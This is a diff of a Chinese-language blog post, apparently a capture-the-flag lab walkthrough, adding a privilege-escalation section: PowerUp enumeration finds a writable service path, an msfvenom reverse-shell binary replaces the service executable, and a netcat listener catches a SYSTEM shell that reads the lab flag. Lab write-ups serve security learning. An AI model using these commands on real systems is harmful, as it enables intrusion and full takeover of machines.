@@ -312,14 +312,14 @@ Starting">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    2.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    9 分
+                    13 分
                 </div>
                 
 
@@ -544,7 +544,136 @@ msf6 exploit(windows&#x2F;http&#x2F;rejetto_hfs_exec) &gt; run
 
 meterpreter &gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>明天再说。。。</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerSploit&#x2F;Privesc&#x2F;PowerUp.ps1 at master · PowerShellMafia&#x2F;PowerSploit (github.com)</a></p>
+<blockquote>
+<p>“PowerUp旨在成为一个集中常见的Windows特权升级向量，这些向量依赖于配置错误的信息库。”</p>
+</blockquote>
+<p>从github下载windows下载脚本并上传</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> upload /root/Desktop/PowerUp.ps1
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> uploading  <span class="token builtin class-name">:</span> /root/Desktop/PowerUp.ps1 -<span class="token operator">></span> PowerUp.ps1
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploaded <span class="token number">586.50</span> KiB of <span class="token number">586.50</span> KiB <span class="token punctuation">(</span><span class="token number">100.0</span>%<span class="token punctuation">)</span>: /root/Desktop/PowerUp.ps1 -<span class="token operator">></span> PowerUp.ps1
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> uploaded   <span class="token builtin class-name">:</span> /root/Desktop/PowerUp.ps1 -<span class="token operator">></span> PowerUp.ps1
+meterpreter <span class="token operator">></span> load powershell
+Loading extension powershell<span class="token punctuation">..</span>.Success.                                                                                                                                                   
+meterpreter <span class="token operator">></span> powershell_shell                                                                                                                                                            
+PS <span class="token operator">></span> <span class="token function">ls</span>                                                                                                                                                                                   
+                                                                                                                                                                                          
+                                                                                                                                                                                          
+    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>bill<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Roaming<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Start Menu<span class="token punctuation">\</span>Programs<span class="token punctuation">\</span>Startup                                                                                                
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----         <span class="token number">9</span>/22/2023  <span class="token number">12</span>:55 AM            %TEMP%
+-a---         <span class="token number">2</span>/16/2014  <span class="token number">12</span>:58 PM     <span class="token number">760320</span> hfs.exe
+-a---         <span class="token number">9</span>/22/2023   <span class="token number">1</span>:00 AM     <span class="token number">600580</span> PowerUp.ps1
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后运行脚本</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PS <span class="token operator">></span> <span class="token builtin class-name">.</span> .<span class="token punctuation">\</span>PowerUp.ps1
+PS <span class="token operator">></span> Invoke-AllChecks
+
+
+ServiceName    <span class="token builtin class-name">:</span> AdvancedSystemCareService9
+Path           <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span><span class="token punctuation">\</span>IObit<span class="token punctuation">\</span>Advanced SystemCare<span class="token punctuation">\</span>ASCService.exe
+ModifiablePath <span class="token builtin class-name">:</span> @<span class="token punctuation">&#123;</span>ModifiablePath<span class="token operator">=</span>C:<span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token assign-left variable">IdentityReference</span><span class="token operator">=</span>BUILTIN<span class="token punctuation">\</span>Users<span class="token punctuation">;</span> <span class="token assign-left variable">Permissions</span><span class="token operator">=</span>AppendData/AddSubdirectory<span class="token punctuation">&#125;</span>
+StartName      <span class="token builtin class-name">:</span> LocalSystem
+AbuseFunction  <span class="token builtin class-name">:</span> Write-ServiceBinary <span class="token parameter variable">-Name</span> <span class="token string">'AdvancedSystemCareService9'</span> <span class="token parameter variable">-Path</span> <span class="token operator">&lt;</span>HijackPath<span class="token operator">></span>
+CanRestart     <span class="token builtin class-name">:</span> True
+Name           <span class="token builtin class-name">:</span> AdvancedSystemCareService9
+Check          <span class="token builtin class-name">:</span> Unquoted Service Paths
+
+ServiceName    <span class="token builtin class-name">:</span> AdvancedSystemCareService9
+Path           <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span><span class="token punctuation">\</span>IObit<span class="token punctuation">\</span>Advanced SystemCare<span class="token punctuation">\</span>ASCService.exe
+ModifiablePath <span class="token builtin class-name">:</span> @<span class="token punctuation">&#123;</span>ModifiablePath<span class="token operator">=</span>C:<span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token assign-left variable">IdentityReference</span><span class="token operator">=</span>BUILTIN<span class="token punctuation">\</span>Users<span class="token punctuation">;</span> <span class="token assign-left variable">Permissions</span><span class="token operator">=</span>WriteData/AddFile<span class="token punctuation">&#125;</span>
+StartName      <span class="token builtin class-name">:</span> LocalSystem
+AbuseFunction  <span class="token builtin class-name">:</span> Write-ServiceBinary <span class="token parameter variable">-Name</span> <span class="token string">'AdvancedSystemCareService9'</span> <span class="token parameter variable">-Path</span> <span class="token operator">&lt;</span>HijackPath<span class="token operator">></span>
+CanRestart     <span class="token builtin class-name">:</span> True
+Name           <span class="token builtin class-name">:</span> AdvancedSystemCareService9
+Check          <span class="token builtin class-name">:</span> Unquoted Service Paths
+
+ServiceName    <span class="token builtin class-name">:</span> AdvancedSystemCareService9
+Path           <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span><span class="token punctuation">\</span>IObit<span class="token punctuation">\</span>Advanced SystemCare<span class="token punctuation">\</span>ASCService.exe
+ModifiablePath <span class="token builtin class-name">:</span> @<span class="token punctuation">&#123;</span>ModifiablePath<span class="token operator">=</span>C:<span class="token punctuation">\</span>Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span><span class="token punctuation">\</span>IObit<span class="token punctuation">;</span> <span class="token assign-left variable">IdentityReference</span><span class="token operator">=</span>STEELMOUNTAIN<span class="token punctuation">\</span>bill<span class="token punctuation">;</span>
+                 <span class="token assign-left variable">Permissions</span><span class="token operator">=</span>System.Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
+StartName      <span class="token builtin class-name">:</span> LocalSystem
+AbuseFunction  <span class="token builtin class-name">:</span> Write-ServiceBinary <span class="token parameter variable">-Name</span> <span class="token string">'AdvancedSystemCareService9'</span> <span class="token parameter variable">-Path</span> <span class="token operator">&lt;</span>HijackPath<span class="token operator">></span>
+CanRestart     <span class="token builtin class-name">:</span> True
+Name           <span class="token builtin class-name">:</span> AdvancedSystemCareService9
+Check          <span class="token builtin class-name">:</span> Unquoted Service Paths
+
+ServiceName    <span class="token builtin class-name">:</span> AdvancedSystemCareService9
+Path           <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span><span class="token punctuation">\</span>IObit<span class="token punctuation">\</span>Advanced SystemCare<span class="token punctuation">\</span>ASCService.exe
+ModifiablePath <span class="token builtin class-name">:</span> @<span class="token punctuation">&#123;</span>ModifiablePath<span class="token operator">=</span>C:<span class="token punctuation">\</span>Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span><span class="token punctuation">\</span>IObit<span class="token punctuation">\</span>Advanced SystemCare<span class="token punctuation">\</span>ASCService.exe<span class="token punctuation">;</span>
+                 <span class="token assign-left variable">IdentityReference</span><span class="token operator">=</span>STEELMOUNTAIN<span class="token punctuation">\</span>bill<span class="token punctuation">;</span> <span class="token assign-left variable">Permissions</span><span class="token operator">=</span>System.Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
+StartName      <span class="token builtin class-name">:</span> LocalSystem
+AbuseFunction  <span class="token builtin class-name">:</span> Write-ServiceBinary <span class="token parameter variable">-Name</span> <span class="token string">'AdvancedSystemCareService9'</span> <span class="token parameter variable">-Path</span> <span class="token operator">&lt;</span>HijackPath<span class="token operator">></span>
+CanRestart     <span class="token builtin class-name">:</span> True
+Name           <span class="token builtin class-name">:</span> AdvancedSystemCareService9
+Check          <span class="token builtin class-name">:</span> Unquoted Service Paths
+
+ServiceName    <span class="token builtin class-name">:</span> AWSLiteAgent
+Path           <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Amazon<span class="token punctuation">\</span>XenTools<span class="token punctuation">\</span>LiteAgent.exe
+ModifiablePath <span class="token builtin class-name">:</span> @<span class="token punctuation">&#123;</span>ModifiablePath<span class="token operator">=</span>C:<span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token assign-left variable">IdentityReference</span><span class="token operator">=</span>BUILTIN<span class="token punctuation">\</span>Users<span class="token punctuation">;</span> <span class="token assign-left variable">Permissions</span><span class="token operator">=</span>AppendData/AddSubdirectory<span class="token punctuation">&#125;</span>
+StartName      <span class="token builtin class-name">:</span> LocalSystem
+AbuseFunction  <span class="token builtin class-name">:</span> Write-ServiceBinary <span class="token parameter variable">-Name</span> <span class="token string">'AWSLiteAgent'</span> <span class="token parameter variable">-Path</span> <span class="token operator">&lt;</span>HijackPath<span class="token operator">></span>
+CanRestart     <span class="token builtin class-name">:</span> False
+Name           <span class="token builtin class-name">:</span> AWSLiteAgent
+Check          <span class="token builtin class-name">:</span> Unquoted Service Paths<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>CanRestart选项为true，允许我们重新启动系统上的服务，应用程序的目录也是可写的。这意味着我们可以用我们的恶意应用程序替换合法的应用程序，重新启动服务，这将运行我们的payload</p>
+<p>生成一个反向shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">10.10</span>.224.102 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4443</span> <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-f</span> exe-service <span class="token parameter variable">-o</span> Advanced.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上传payload</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">meterpreter <span class="token operator">></span> upload /root/Desktop/Advanced.exe
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> uploading  <span class="token builtin class-name">:</span> /root/Desktop/Advanced.exe -<span class="token operator">></span> Advanced.exe                                                                                                                               
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploaded <span class="token number">15.50</span> KiB of <span class="token number">15.50</span> KiB <span class="token punctuation">(</span><span class="token number">100.0</span>%<span class="token punctuation">)</span>: /root/Desktop/Advanced.exe -<span class="token operator">></span> Advanced.exe                                                                                                  
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> uploaded   <span class="token builtin class-name">:</span> /root/Desktop/Advanced.exe -<span class="token operator">></span> Advanced.exe                                                         <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>进入shell(不是powershell)，停止AdvancedSystemCareService9服务</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sc stop AdvancedSystemCareService9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>替换服务启动文件</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">copy ASCService.exe <span class="token string">"C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>启动监听</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>启动服务</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sc start AdvancedSystemCareService9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功收到shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
+└─<span class="token comment"># nc -lvnp 4443</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4443</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.224.102<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.138.199<span class="token punctuation">]</span> <span class="token number">49257</span>
+Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">6.3</span>.9600<span class="token punctuation">]</span>
+<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2013</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span>cd c:/users/administrator/desktop
+<span class="token builtin class-name">cd</span> c:/users/administrator/desktop
+
+c:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span>dir
+<span class="token function">dir</span>
+ Volume <span class="token keyword">in</span> drive C has no label.
+ Volume Serial Number is 2E4A-906A
+
+ Directory of c:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop
+
+<span class="token number">10</span>/12/2020  <span class="token number">12</span>:05 PM    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          <span class="token builtin class-name">.</span>
+<span class="token number">10</span>/12/2020  <span class="token number">12</span>:05 PM    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          <span class="token punctuation">..</span>
+<span class="token number">10</span>/12/2020  <span class="token number">12</span>:05 PM             <span class="token number">1,528</span> activation.ps1
+09/27/2019  05:41 AM                <span class="token number">32</span> root.txt
+               <span class="token number">2</span> File<span class="token punctuation">(</span>s<span class="token punctuation">)</span>          <span class="token number">1,560</span> bytes
+               <span class="token number">2</span> Dir<span class="token punctuation">(</span>s<span class="token punctuation">)</span>  <span class="token number">44,156</span>,116,992 bytes <span class="token function">free</span>
+
+c:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span>type root.txt
+<span class="token builtin class-name">type</span> root.txt
+9af5f314f57607c00fd09803a587db80
+c:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrator<span class="token punctuation">\</span>Desktop<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="无MSF的访问与权限升级"><a href="#无MSF的访问与权限升级" class="headerlink" title="无MSF的访问与权限升级"></a>无MSF的访问与权限升级</h2><p>我们利用powershell和winPEAS枚举系统并收集相关信息来进行权限升级</p>
 
                 
             </div>
